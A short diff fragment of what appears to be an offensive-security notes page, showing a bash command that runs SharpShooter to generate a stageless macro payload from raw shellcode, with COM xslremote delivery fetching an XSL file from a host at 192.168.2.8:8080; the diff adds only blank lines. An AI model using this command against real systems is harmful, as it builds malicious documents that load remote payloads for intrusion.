@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:58.370277+00:00'
 ```bash
 SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
 ```
+
+
